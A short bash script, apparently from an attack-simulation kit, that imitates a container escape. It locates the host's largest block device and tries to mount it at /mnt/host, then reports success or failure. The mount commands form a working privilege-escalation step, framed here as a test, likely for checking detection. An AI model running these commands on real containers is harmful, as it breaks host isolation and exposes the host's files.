#!/bin/bash

# define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

# mount root host filesystem
echo -e "\n${YELLOW}>>> [Privilege Escalation] Escape to Host Technique ${RESET}"
echo "Let's simulate the case when an attacker mounts root host filesystem inside the container"

# Initialize error variable
error=""

echo "Discovering root host block devices ..."

# Discover root host block device
device=$(lsblk -o NAME,SIZE -d | sort -k2 -h | tail -n 1 | awk '{print $1}')

echo "Trying to mount root host device /dev/${device} ..."

# Create mount point directory
mkdir -p /mnt/host

# Try to mount root host device
if ! mount /dev/$device /mnt/host/ >/dev/null 2>&1; then
    error="Failed to mount /dev/$device"
fi

# Display result
if [[ -n "$error" ]]; then
    echo -e "${RED}Error! Mount attempt was done but failed: $error ${RESET}"
    else
    echo -e "${Green}Success! Mount attempt was successful ${RESET}"
fi